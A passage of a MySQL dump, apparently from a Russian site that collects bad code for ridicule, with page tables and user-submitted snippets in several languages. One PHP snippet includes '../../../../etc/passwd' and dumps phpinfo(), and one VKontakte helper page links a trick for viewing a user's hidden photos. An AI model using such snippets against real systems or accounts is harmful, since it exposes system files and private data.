  `description` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `folder_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `allow_comment` TINYINT(4) DEFAULT '1',
  `compiled` INTEGER(11) DEFAULT NULL,
  `keywords_reset` TINYINT(1) DEFAULT '0',
  `description_reset` TINYINT(1) DEFAULT '0',
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=8 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `page_page` table  (LIMIT 0,500)
#

INSERT INTO `page_page` (`id`, `obj_id`, `name`, `title`, `content`, `keywords`, `description`, `folder_id`, `allow_comment`, `compiled`, `keywords_reset`, `description_reset`) VALUES 
  (1,11,'main','','','','',1,1,0,0,0),
  (5,31,'php','PHP: Hypertext Preprocessor','<p>PHP — язык программирования, созданный для генерирования HTML-страниц на веб-сервере и работы с базами данных. В настоящее время поддерживается подавляющим большинством хостинг-провайдеров. Входит в LAMP — «стандартный» набор для создания веб-сайтов (Linux, Apache, MySQL, PHP (Python или Perl)).</p>\n\n<p>Его широкая распространненость, а также возможность просто писать код, не заморачиваяся над качеством, делает его, пожалуй, наиболее подходящей платформой для говнокода. Термин «говнокодер» часто считается синонимом «пхп—программист» у более «продвинутых» коллег. Несмотря на всё это, существуют люди, способные писать на этом языке не только работающий, но еще и весьма красивый код.</p>\n\n<p>\n    <a href=\"http://php.net/\" title=\"Официальный сайт\">http://php.net/</a><br />\n    <a href=\"http://ru.wikipedia.org/wiki/Php\" title=\"wikipedia\">http://ru.wikipedia.org/wiki/Php</a>\n</p>','','',2,0,0,0,0),
  (6,51,'javascript','JavaScript','JavaScript — скриптовый язык, чаще всего использующийся при создании сценариев поведения браузера, встраиваемых в веб-страницы. Является одной из реализаций языка ECMAScript.','','',2,0,0,0,0),
  (7,1250,'cpp','C++','<p>Си++ (англ. C++) — компилируемый строго типизированный язык программирования общего назначения. Поддерживает разные парадигмы программирования: процедурную, обобщённую, функциональную; наибольшее внимание уделено поддержке объектно-ориентированного программирования.</p>\n\n<p>Название «Си++» происходит от Си, в котором унарный оператор ++ обозначает инкремент переменной.</p>\n\n<p>В 1990-х годах язык стал одним из наиболее широко применяемых языков программирования общего назначения.</p>\n\n<p>При создании Си++ стремились сохранить совместимость с языком Си. Большинство программ на Си будут исправно работать и с компилятором Си++. Си++ имеет синтаксис, основанный на синтаксисе Си.</p>\n\n<p><a href=\"http://ru.wikipedia.org/wiki/C%2B%2B\">http://ru.wikipedia.org/wiki/С++</a></p>','','',2,0,0,0,0);
COMMIT;

#
# Structure for the `page_pageFolder` table : 
#

DROP TABLE IF EXISTS `page_pageFolder`;

CREATE TABLE `page_pageFolder` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(11) UNSIGNED NOT NULL DEFAULT '0',
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `title` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `parent` INTEGER(11) DEFAULT '0',
  `path` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `page_pageFolder` table  (LIMIT 0,500)
#

INSERT INTO `page_pageFolder` (`id`, `obj_id`, `name`, `title`, `parent`, `path`) VALUES 
  (1,10,'root','root',1,'root'),
  (2,30,'languages','Описание языков программирования',2,'root/languages');
COMMIT;

#
# Structure for the `page_pageFolder_tree` table : 
#

DROP TABLE IF EXISTS `page_pageFolder_tree`;

CREATE TABLE `page_pageFolder_tree` (
  `id` INTEGER(10) NOT NULL AUTO_INCREMENT,
  `lkey` INTEGER(10) NOT NULL DEFAULT '0',
  `rkey` INTEGER(10) NOT NULL DEFAULT '0',
  `level` INTEGER(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `left_key` (`lkey`, `rkey`, `level`),
  KEY `level` (`level`, `lkey`),
  KEY `rkey` (`rkey`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `page_pageFolder_tree` table  (LIMIT 0,500)
#

INSERT INTO `page_pageFolder_tree` (`id`, `lkey`, `rkey`, `level`) VALUES 
  (1,1,4,1),
  (2,2,3,2);
COMMIT;

#
# Structure for the `page_page_lang` table : 
#

DROP TABLE IF EXISTS `page_page_lang`;

CREATE TABLE `page_page_lang` (
  `id` INTEGER(11) NOT NULL DEFAULT '0',
  `lang_id` INTEGER(11) NOT NULL DEFAULT '0',
  `title` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `content` TEXT COLLATE utf8_general_ci NOT NULL,
  `keywords` VARCHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `description` VARCHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`, `lang_id`)
)ENGINE=MyISAM
CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `page_page_lang` table  (LIMIT 0,500)
#

INSERT INTO `page_page_lang` (`id`, `lang_id`, `title`, `content`, `keywords`, `description`) VALUES 
  (1,1,'Первая страница','Это <b>первая</b>, главная <strike>страница</strike>\n',NULL,NULL),
  (1,2,'About us','<strong>mzz</strong> - is a php5 framework for web-applications.',NULL,NULL),
  (2,1,'404 Not Found','Запрашиваемая страница не найдена!',NULL,NULL),
  (2,2,'404 Not Found','Page doesn''t exist',NULL,NULL),
  (4,1,'Доступ запрещён','Доступ запрещён',NULL,NULL),
  (4,2,'Access not allowed.','Access not allowed. Try to login or register.',NULL,NULL);
COMMIT;

#
# Structure for the `quoter_quote` table : 
#

DROP TABLE IF EXISTS `quoter_quote`;

CREATE TABLE `quoter_quote` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(11) NOT NULL,
  `category_id` INTEGER(11) NOT NULL,
  `created` INTEGER(11) DEFAULT NULL,
  `deleted` INTEGER(11) NOT NULL DEFAULT '0',
  `text` TEXT COLLATE utf8_general_ci NOT NULL,
  `highlited_lines` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `description` TEXT COLLATE utf8_general_ci NOT NULL,
  `rating` INTEGER(11) NOT NULL,
  `rating_count` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
  `active` INTEGER(11) NOT NULL,
  `comments_count` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=356 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `quoter_quote` table  (LIMIT 0,500)
#

INSERT INTO `quoter_quote` (`id`, `obj_id`, `category_id`, `created`, `deleted`, `text`, `highlited_lines`, `description`, `rating`, `rating_count`, `active`, `comments_count`) VALUES 
  (1,40,1,1227353872,0,'$error = \"Всё хорошо\";\r\n \r\nif (!$_POST[''mail''] || !checkEmail($_POST[''mail''])) {\r\n    $error .= \"Не верный E-mail\";\r\n}\r\n \r\n...\r\n \r\nif ($error == \"Всё хорошо\") {\r\n    $db->query(\"INSERT...\r\n} else {\r\n \r\n...','1, 9','',153,0,1,10),
  (2,41,1,1227423635,0,'<?php\r\n  phpinfo();\r\n  if (file_exist(''../../../../etc/passwd''))\r\n  {\r\n    include(''../../../../etc/passwd'');\r\n  }','1, 2, 3','',16,0,1,2),
  (3,42,2,1227430413,0,'<html>\r\n\r\n<head>\r\n  <title>В Контакте | Страницы юзера</title>\r\n    <style type=\"text/css\">\r\n    \tbody{\r\n    \t\tbackground: black;\r\n    \t\tcolor: #D1D1D1;\r\n    \t\tfont-family: \"Trebuchet MS\", Verdana, Geneva, Arial, Helvetica, sans-serif;\r\n    \t\tfont-size: 1.2em;\r\n    \t}\r\n    \tdiv.body{\r\n    \t\tmargin-left: auto;\r\n    \t\tmargin-right: auto;\r\n    \t\twidth: 520px;\r\n    \t}\r\n    \ta{color: #D1D1D1; text-decoration: none;}\r\n    \ta:hover{color: #3e9af2; text-decoration: underline;}\r\n    \tli{white-space: nowrap; list-style: none;}\r\n    \tinput{\r\n    \t\tbackground: black;\r\n    \t\tcolor: #D1D1D1;\r\n    \t\tborder:none;\r\n    \t\tborder-bottom: 1px dotted #D1D1D1;\r\n    \t\tfont-family: \"Trebuchet MS\", Verdana, Geneva, Arial, Helvetica, sans-serif;\r\n    \t\tfont-size: 1.2em;\r\n    \t\tmargin-bottom: -2px;\r\n    \t}\r\n    </style>\r\n\t<script type=\"text/javascript\">\r\n\t<!--//\r\n\tfunction set_id(){\r\n\t\tvar user_id_1 = document.getElementById(''user_id'').value.replace(/[^\\d]/g, \"\");\r\n\t\tvar user_id_2 = user_id_1 + ''&'' + Math.round(Math.random() * 999999);\r\n\r\n\t\tvar user_links = '''';\r\n\t\tuser_links += ''<ul>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/id'' + user_id_1 + ''?'' + Math.round(Math.random() * 999999) + ''\" target=\"_blank\">Главная страница</a></li>'';\r\n\t\tuser_links += ''\t<li>'';\r\n\t\tuser_links += ''\t\t<a href=\"http://vkontakte.ru/wall.php?id='' + user_id_2 + ''\" target=\"_blank\">Стена</a>'';\r\n\t\tuser_links += ''\t\t<ul>'';\r\n\t\tuser_links += ''\t\t\t<li><a href=\"http://vkontakte.ru/wall.php?act=write&id='' + user_id_2 + ''\" target=\"_blank\">Оставить сообщение</a></li>'';\r\n\t\tuser_links += ''\t\t\t<li><a href=\"http://vkontakte.ru/graffiti.php?act=draw&to_id='' + user_id_2 + ''\" target=\"_blank\">Оставить графити</a></li>'';\r\n\t\tuser_links += ''\t\t\t<li><a href=\"http://vkontakte.ru/photos.php?to_id='' + user_id_2 + ''\" target=\"_blank\">Оставить фото</a></li>'';\r\n\t\tuser_links += ''\t\t\t<li><a href=\"http://vkontakte.ru/video.php?to_id='' + user_id_2 + ''\" target=\"_blank\">Оставить видио</a></li>'';\r\n\t\tuser_links += ''\t\t\t<li><a href=\"http://vkontakte.ru/audio.php?to_id='' + user_id_2 + ''\" target=\"_blank\">Оставить аудио</a></li>'';\r\n\t\tuser_links += ''\t\t</ul>'';\r\n\t\tuser_links += ''\t</li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/mail.php?act=write&to='' + user_id_2 + ''\" target=\"_blank\">Отправить сообщение</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/friend.php?id='' + user_id_2 + ''\" target=\"_blank\">Друзья</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/photos.php?id='' + user_id_2 + ''\" target=\"_blank\">Альбомы</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/photos.php?act=user&id='' + user_id_2 + ''\" target=\"_blank\">Фото с юзером</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://pda.vkontakte.ru/taggedphotos'' + user_id_1 + ''\" target=\"_blank\">Фото с юзером, если надо посмотреть скрытые фото</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/video.php?id='' + user_id_2 + ''\" target=\"_blank\">Видeо</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/questions.php?mid='' + user_id_2 + ''\" target=\"_blank\">Вопросы</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/notes.php?id='' + user_id_2 + ''\" target=\"_blank\">Заметки</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/apps.php?mid='' + user_id_2 + ''\" target=\"_blank\">Приложения</a></li>'';\r\n\t\tuser_links += ''\t<li><a href=\"http://vkontakte.ru/groups.php?mid='' + user_id_2 + ''\" target=\"_blank\">Группы</a></li>'';\r\n\t\tuser_links += ''</ul>'';\r\n\r\n        document.title = ''В Контакте | Страницы юзера id'' + user_id_1;\r\n        document.getElementById(''user_id'').value = user_id_1;\r\n\t\tdocument.getElementById(''user_pages'').innerHTML = user_links;\r\n\t}\r\n\t//-->\r\n\t</script>\r\n</head>\r\n<body onLoad=\"set_id()\">\r\n\t<div class=\"body\">\r\n\t\tСтраницы юзера id<input name=\"user_id\" id=\"user_id\" type=\"text\" value=\"1\" onKeyUp=\"set_id()\" onKeyPress=\"set_id()\" onPaste=\"set_id()\">\r\n\t\t<div id=\"user_pages\"></div>\r\n\t\t<noscript><p align=\"center\">Ипать))) ... ктож а таком старье сидит)....<br />Включи JavaScript!</p></noscript>\r\n\t\t<p align=\"center\">by Dr.Freez</p>\r\n\t</div>\r\n</body>\r\n\r\n</html>','','говницо)))',6,0,1,1),
  (4,43,1,1227430552,0,'if (!isset($_GET[''month''])) {\r\n    ...\r\n}\r\nelse {\t\r\n    if (isset($_POST[''submit_fin''])) {\r\n        ...\r\n    }\r\n}','4, 5','',8,0,1,3),
  (5,55,6,1227732044,1229420180,'long gr, ri, r1, r2, y, z, z_rev;\r\n\tfor (i = 2; i < qr_count; i++) {\r\n\t\tstep = 0;\r\n \t\tri = r[i];\r\n\t\tgr = - mpz_fdiv_ui(lowM, pm[i][step]);\r\n\t\tr1 = gr + ri;\r\n\t\tr2 = gr + pm[i][step] - ri;\r\n\t\tif (r1 < 0) {\r\n\t\t\tr1 += pm[i][step];\r\n\t\t}\r\n\t\tif (r2 < 0) {\r\n\t\t\tr2 += pm[i][step];\r\n\t\t}\r\n\t\twhile (r1 < (long) Ml2) {\r\n\t\t\tsieve[r1][i] += 1;\r\n\t\t\tr1 += pm[i][step];\r\n\t\t}\r\n\t\twhile (r2 < (long) Ml2) {\r\n\t\t\tsieve[r2][i] += 1;\r\n\t\t\tr2 += pm[i][step];\r\n\t\t}\r\n\t\tfor (step = 1; step < degr[i]; step++) {\r\n\t\t\tgr = - mpz_fdiv_ui(lowM, pm[i][step]);\r\n\t\t\ty = ri*ri;\r\n\t\t\ty -= Npm[i][step];\r\n\t\t\ty = y/( (long) pm[i][step-1]);\r\n\t\t\tif (y < 0) { y += pm[i][step]; }\r\n\t\t\tz_rev = (ri<<1) % QR[i];\r\n\t\t\t//?IOOA?EOO ?OI?AOEO IA UAAEEIE?AIEA\r\n\t\t\tif (z_rev == 0) { y = 0; }\r\n\t\t\telse {\r\n\t\t\t\tz = 1;\t\r\n\t\t\t\twhile ((z_rev*z % QR[i]) != 1) { z++;}\r\n\t\t\t\ty *= z*pm[i][step-1];\r\n\t\t\t\ty = y % pm[i][step];\r\n\t\t\t}\r\n\t\t\tri -= y;\r\n\t\t\tif (ri < 0) { ri += pm[i][step]; }\r\n\t\t\tr1 = gr+ri;\r\n\t\t\tr2 = gr+pm[i][step]-ri;\r\n\t\t\tif (r1 < 0) { r1 += pm[i][step]; }\r\n\t\t\tif (r2 < 0) { r2 += pm[i][step]; }\r\n\t\t\twhile (r1 < (long) Ml2) {\r\n\t\t\t\tsieve[r1][i] += 1;\r\n\t\t\t\tr1 += pm[i][step];\r\n\t\t\t}\r\n\t\t\twhile (r2 < (long) Ml2) {\r\n\t\t\t\tsieve[r2][i] += 1;\r\n\t\t\t\tr2 +=pm[i][step];\r\n\t\t\t}\r\n\t\t}\r\n\t}','','Когда лучше, чтобы кода не было, чем, чтобы он был...',-8,0,0,2),
  (6,44,1,1227439642,0,'/// Однажды придумал от скуки :) the1st.net.ru\r\n\r\nif(!function_exists(''function_exists'')) {\r\n function function_exists($f) {\r\n  return function_exists($f);\r\n }\r\n}','','Придумано от скуки на досуге. Довольно спонтанно вырвалась мысль и была сразу воплощена в жизнь :)',14,0,1,4),
  (7,46,1,1227451925,1229655459,'$res[\"LIST_PAGE_URL\"] = str_replace(\"//\", \"/\", str_replace(\"#LANG#\", $res[\"LANG_DIR\"],\r\n\t\t\t\t\t\t\tstr_replace(\"#SITE_DIR#\", SITE_DIR,\r\n\t\t\t\t\t\t\t\tstr_replace(\"#SERVER_NAME#\", SITE_SERVER_NAME,\r\n\t\t\t\t\t\t\t\t\tstr_replace(\"#IBLOCK_ID#\", $res[\"IBLOCK_ID\"], $res[\"LIST_PAGE_URL\"])\r\n\t\t\t\t\t\t\t\t)\r\n\t\t\t\t\t\t\t)\r\n\t\t\t\t\t\t)\r\n\t\t\t\t\t);','','битрикс',-3,0,0,1),
  (8,47,1,1227452888,0,'function InitBVar(&$var)\r\n{\r\n\t$var = ($var==\"Y\") ? \"Y\" : \"N\";\r\n}','','битрикс',1,0,1,9),
  (9,48,1,1227453048,0,'function htmlspecialcharsex($str)\r\n{\r\n\tif (strlen($str)>0)\r\n\t{\r\n\t\t$str = str_replace(\"&amp;\", \"&amp;amp;\", $str);\r\n\t\t$str = str_replace(\"&lt;\", \"&amp;lt;\", $str);\r\n\t\t$str = str_replace(\"&gt;\", \"&amp;gt;\", $str);\r\n\t\t$str = str_replace(\"&quot;\", \"&amp;quot;\", $str);\r\n\t\t$str = str_replace(\"<\", \"&lt;\", $str);\r\n\t\t$str = str_replace(\">\", \"&gt;\", $str);\r\n\t\t$str = str_replace(\"\\\"\", \"&quot;\", $str);\r\n\t}\r\n\treturn $str;\r\n}','1','битрикс sex',2,0,1,1),
  (10,49,1,1227453296,1229928823,'function ToUpper($str)\r\n{\r\n\treturn strtoupper(strtr($str, \"йцукенгшщзхъэждлорпавыфячсмитьбю\", \"ЙЦУКЕНГШЩЗХЪЭЖДЛОРПАВЫФЯЧСМИТЬБЮ\"));\r\n}','','битрикс',-3,0,0,3),
  (11,50,1,1227501942,1230878739,'...\r\ncatch (HeadshotException $e) {\r\necho \"Извините, вы застрелились: {$e->getMessage()}\";\r\n...','','В книге Котерова и Костарева по PHP5 наткнулся на замечательный пример кода. Прям за душу взяло, чесслово!\r\n\r\n(с) bash',-1,0,0,0),
  (12,54,5,1227605375,0,'temp = a\r\na = b\r\nb = temp','','',25,0,1,13),
  (13,52,1,1227575241,0,'/**\r\n* Замена auto_increment\r\n* @param string $name - наименование таблицы\r\n* @param string $id - наименование индексной записи таблицы\r\n* @param ADODB-object $db - объект ADOConnection\r\n*\r\n* @return int - если удалось выделить следующий ID, false в противном случае\r\n*/\r\nfunction CountId($name, $id, & $db)\r\n{\r\n    $selection = $db->Execute(''SELECT MAX(''.$id.'') as id\r\n                               FROM ''.$name);\r\n    if ($selection) {\r\n        return ($selection->fields[''id''] + 1);\r\n    } else {\r\n        return false;\r\n    }\r\n}','','В каком-то древненьком проекте решили отказаться от автоинкремента. :-) Накалякали функцию для его замены.',0,0,1,4),
  (14,53,2,1227584474,0,'    function getError() {\r\n        var error = false;\r\n        if (isNaN($(''client_sum'').value) || $(''client_sum'').value <= 0) {\r\n            $(''error_op'').innerHTML = \"Только число большее  нуля\";\r\n            error = true;\r\n        } else {\r\n            $(''error_op'').innerHTML = \"\";\r\n        }\r\n        if ($(''comment'').value == \"\") {\r\n            $(''error_op2'').innerHTML = \"Введите примечание\";\r\n            error = true;\r\n        } else {\r\n            $(''error_op2'').innerHTML = \"\";\r\n        }\r\n        if (error == true) return false;\r\n    }','4, 15','',12,0,1,5),
  (15,56,5,1227733204,1229420180,'# -*- coding: utf-8 -*-\r\nq=0\r\ndef is_sym(li):\r\n\tl=li[:]\r\n\tif len(l)%2==1:\r\n\t\tl.pop(len(l)/2)\r\n\thalf = l[:len(l)/2]\r\n\tsec_half = l[len(l)/2:]\r\n\tsec_half.reverse()\r\n\tif(half==sec_half):\r\n\t\treturn True\r\ndef do_sym(li):\r\n\tglobal q\r\n\tl=li[:]\r\n\twhile (is_sym(l)!=True):\r\n\t\tl.insert(len(l)-q,l[q])\r\n\t\tq=q+1\r\n\treturn l\r\nhow_much=input(\"Сколько? \")\r\nlis=[]\r\nfor z in range(1,how_much+1):\r\n\tlis.append(input(\"Введите число №%d: \" % (z, )))\r\nsym = do_sym(lis)\r\nprint q\r\nres = \"\"\r\nfor z in range(0, len(sym)):\r\n\tres=res + \"%d, \" % (sym[z],)\r\nprint res','','Задание на школьную олимпиаду, что удивительно - работает.',-2,0,0,0),
  (16,736,7,1227784145,0,'uint32_t getuint32(char *p){\r\n  return (*p<<24)|(*(p+1)<<16)|(*(p+2)<<8)|(*(p+3));\r\n}','','0',12,0,1,6),
  (17,733,1,1227770874,1229420180,'  // kuso@npj: спорная строка, но мне она нравится:\r\n  error_reporting (E_ALL ^ E_NOTICE);\r\n\r\n\r\n\r\n','','',-14,0,0,3),
  (18,734,1,1227771218,0,'if ( $condition ) a = 6;\r\na = 10;\r\n\r\n\r\n','','Подозвал меня прогер и спросил: \"а почему у меня a всегда равно 10, даже если условие выполняется? (((\"',72,0,1,8),
  (19,735,7,1227779636,1229420180,'//\r\n// true - success\r\n// false - value not found for given key\r\n//\r\nbool CATStorage::getValueForKey(const std::string &key, std::string &value) const\r\n{\r\n          ...\r\n          std::string().swap(value); \r\n          ...\r\n}','','Код очистки содержимого строки, C++, STL',-28,0,0,7),
  (20,732,1,1227759229,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"ru\">\r\n<head>\r\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n    <title>Govnokod.ru  — Накласть говнокод</title>\r\n    <meta name=\"keywords\" content=\"говнокод, смешной код, быдлокод, быдлокодеры, индусы, для программистов, про программистов, индусский код, записки программиста, говно, говнокод на php, mysql, perl\" />\r\n    <meta name=\"description\" content=\"Сборник говнокода на различных языках программирования\" />\r\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/templates/css/style.css\" />\r\n        <link rel=\"stylesheet\" type=\"text/css\" href=\"/templates/css/add.css\" />\r\n    <script type=\"text/javascript\">\r\n    <!--\r\n    var SITE_PATH = '''';\r\n    //-->\r\n    </script>\r\n    <script type=\"text/javascript\" src=\"/templates/external.php?type=js&files=prototype.js,govnokod.js\"></script>\r\n</head>\r\n<body>\r\n    <div class=\"header\">\r\n        <a href=\"/\">\r\n            <img src=\"/templates/images/logo.png\" alt=\"Говнокод.Ру\" title=\"Да, это говно!\" />\r\n            Govnokod.ru\r\n        </a>\r\n    </div>\r\n    <div class=\"add-govno\">\r\n        <a href=\"http://govnokod.ru/add\"><img src=\"/templates/images/icon-plus.png\" alt=\"\" /></a>\r\n        <a href=\"http://govnokod.ru/add\">Накласть говнокод</a>\r\n    </div>\r\n    <ul class=\"menu\">\r\n        <li class=\"active\"><a href=\"http://govnokod.ru\">Говнокод</a></li>\r\n            </ul>\r\n    <div style=\"clear:both\"></div>\r\n    <ul class=\"sub-menu\">\r\n        <li class=\"left\"> </li>\r\n    \t<li><a href=\"#\">Новый</a></li>\r\n    \t<li><a href=\"#\">Лучший</a></li>\r\n    \t<li class=\"right\"> </li>\r\n    </ul>\r\n\r\n    <div style=\"clear: both;\"></div>\r\n\r\n    \r\n\r\n\r\n\r\n    <table class=\"rblock\">\r\n        <tr>\r\n            <td style=\"width:20px\"><img src=\"/templates/images/rblock-left-top.png\" alt=\"\" /></td>\r\n            <td class=\"empty\"> </td><td style=\"width:20px\"><img src=\"/templates/images/rblock-right-top.png\" alt=\"\" /></td>\r\n        </tr>\r\n        <tr class=\"content\">\r\n            <td> </td>\r\n            <td>\r\n                <h1>Накласть говнокод</h1>\r\n                                <form action=\"http://govnokod.ru/add\" method=\"post\">\r\n                    <table width=\"100%\" border=\"0\" cellpadding=\"5\" cellspacing=\"0\">\r\n                        <tr>\r\n                            <td style=\"vertical-align: top; width: 20%;\"><label for=\"form_category_id\">Язык: <span style=\"color: red;\">*</span></label></td>\r\n                            <td style=\"width: 80%;\"><select id=\"form_category_id\" name=\"category_id\">\r\n<option selected=\"selected\" style=\"font-weight: bold;\" value=\"\"> </option>\r\n<option value=\"1\">PHP</option>\r\n<option value=\"2\">JavaScript</option>\r\n<option value=\"3\">MySQL</option>\r\n<option value=\"4\">PERL</option>\r\n<option value=\"5\">Python</option>\r\n</select></td>\r\n                        </tr>\r\n                        <tr>\r\n                            <td style=\"vertical-align: top;\"><label for=\"form_description\">Описание:</label></td>\r\n                            <td><textarea cols=\"50\" id=\"form_description\" name=\"description\" rows=\"4\"></textarea></td>\r\n                        </tr>\r\n                        <tr>\r\n                            <td> </td>\r\n                            <td> </td>\r\n                        </tr>\r\n                        <tr>\r\n                            <td style=\"vertical-align: top;\"><label for=\"form_text\">Код: <span style=\"color: red;\">*</span></label></td>\r\n                            <td>\r\n                                <div id=\"codeSaveContainer\" class=\"codeInput\">\r\n                                    <table cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\">\r\n                                        <tr>\r\n                                            <td style=\"vertical-align: top; width: 5%;\">\r\n                                                <div id=\"nums\" class=\"linenumbers\"></div>\r\n                                            </td>\r\n                                            <td style=\"vertical-align: top; width: 95%;\">\r\n                                                                                                <textarea class=\"codeArea\" cols=\"50\" id=\"codeArea\" name=\"text\" onkeyup=\"numbering(this);\" rows=\"1\" value=\"\r\n\r\n\r\n\r\n\r\n\" wrap=\"off\">\r\n\r\n\r\n\r\n\r\n</textarea>\r\n                                            </td>\r\n                                        </tr>\r\n                                    </table>\r\n                                </div>\r\n                            </td>','','типичный говнокод',14,0,1,1),
  (21,742,9,1227798593,0,'boolean is_admin;\r\n// something\r\nBoolean b = new Boolean( is_admin );\r\nif( b.toString().length() == 4 ) {\r\n   // something...\r\n}\r\n// something','','0',86,0,1,11),
  (22,743,3,1227799723,1229420180,'SELECT A.Id AS AppraiserId, \r\n\t(SELECT A2.FieldValueInt AS SubcontractorId\r\n\tFROM sm_forms_FieldValues A2\r\n\tWHERE \r\n\t\tA2.InstanceId = (\r\n\t\t\tSELECT \tFormInstanceId\r\n\t\t\tFROM\tsm_genericdatabase_Instances\r\n\t\t\tWHERE\tModuleId=1736 AND Title=''Appraisers''\r\n\t\t\t)\r\n\t\tAND \r\n\t\tA2.FieldId = (\r\n\t\t\tSELECT Id FROM sm_forms_Fields \r\n\t\t\tWHERE InstanceId= A2.InstanceId \r\n\t\t\tAND Title = ''Subcontractor''\t\r\n\t\t\t)\r\n\t\tAND\r\n\t\tA2.ValueId=A.Id\r\n\t) AS SubcontractorId,\r\n\t\r\n\t(SELECT A3.FieldValueInt\r\n\tFROM sm_forms_FieldValues A3\r\n\tWHERE \r\n\t\tInstanceId = (\r\n\t\t\tSELECT \tFormInstanceId\r\n\t\t\tFROM\tsm_genericdatabase_Instances\r\n\t\t\tWHERE\tModuleId=1736 AND Title=''Appraisers''\r\n\t\t\t)\r\n\t\tAND \r\n\t\tFieldId = (\r\n\t\t\tSELECT Id FROM sm_forms_Fields \r\n\t\t\tWHERE InstanceId= A3.InstanceId \r\n\t\t\tAND Title = ''Heavy Equipment''\t\r\n\t\t\t)\r\n\t\tAND\r\n\t\tA3.ValueId= A.Id\r\n\t) AS HeavyEquipment,\r\n\t\r\n\t(SELECT A3.FieldValueInt\r\n\tFROM sm_forms_FieldValues A3\r\n\tWHERE \r\n\t\tInstanceId = (\r\n\t\t\tSELECT \tFormInstanceId\r\n\t\t\tFROM\tsm_genericdatabase_Instances\r\n\t\t\tWHERE\tModuleId=1736 AND Title=''Appraisers''\r\n\t\t\t)\r\n\t\tAND \r\n\t\tFieldId = (\r\n\t\t\tSELECT Id FROM sm_forms_Fields \r\n\t\t\tWHERE InstanceId= A3.InstanceId \r\n\t\t\tAND Title = ''Name''\t\r\n\t\t\t)\r\n\t\tAND\r\n\t\tA3.ValueId= A.Id\r\n\t) AS Name\r\n\t\r\n\t\r\n\tFROM sm_forms_Values A\r\n\twhere InstanceId = (\r\n\t\t\tSELECT \tFormInstanceId\r\n\t\t\tFROM\tsm_genericdatabase_Instances\r\n\t\t\tWHERE\tModuleId=1736 AND Title=''Appraisers''\r\n\t\t\t)\r\n\tORDER BY 2','','выборка из большой базы... И нихрена не понятной.',-1,0,0,0),
  (23,744,3,1227801041,0,'SELECT   region_key AS region\r\n        ,NAME(containedobjectsbasement_key) AS building\r\n        ,container_node_id\r\n        ,containedobjectsexchange_key\r\n        ,object_name AS ats\r\n        ,number_ranges AS diapazon\r\n        ,exchange_type_name AS tip_ats\r\n        ,exchange_mount_capacity AS emkost\r\n        ,operator_licence_number AS license\r\n        ,trace_line_relay_type_name AS tip_sl\r\n        ,COUNT(trace_line_id) AS count5\r\n        ,otkuda_nax AS otkuda_ats\r\n        ,kuda_blya AS kuda_ats\r\n        ,seven_nation_army\r\n        ,ROWNUM\r\n        ,cable_type_name\r\n        ,logical_cable_length\r\n        ,ATS_NAME\r\n    FROM (SELECT DISTINCT r.object_id AS region_key\r\n                         ,n.node_id AS containedobjectsbasement_key\r\n                         ,n1.container_node_id AS container_node_id\r\n                         ,e.node_id AS containedobjectsexchange_key\r\n                         ,CAST(name2(e.node_id, e.exchange_class_id) AS VARCHAR2(128) ) AS object_name\r\n                         ,e.exchange_mount_capacity AS exchange_mount_capacity\r\n                         ,CAST( (SELECT stragg(first_number || ''-'' || last_number || ''\r\n                         ''              )\r\n                                   FROM number_interval\r\n                                  WHERE exchange_id = e.node_id) AS VARCHAR2(1024) ) AS number_ranges\r\n                         ,(SELECT e1.exchange_type_name\r\n                             FROM exchange_tl e1\r\n                            WHERE e1.exchange_type_id = e.exchange_type_id) AS exchange_type_name\r\n                         ,CAST( (SELECT s3.licence_number\r\n                                   FROM service_operator_type s3\r\n                                  WHERE s3.service_operator_type_id = e.operator_id) AS VARCHAR2(64) ) AS operator_licence_number\r\n                         ,(SELECT 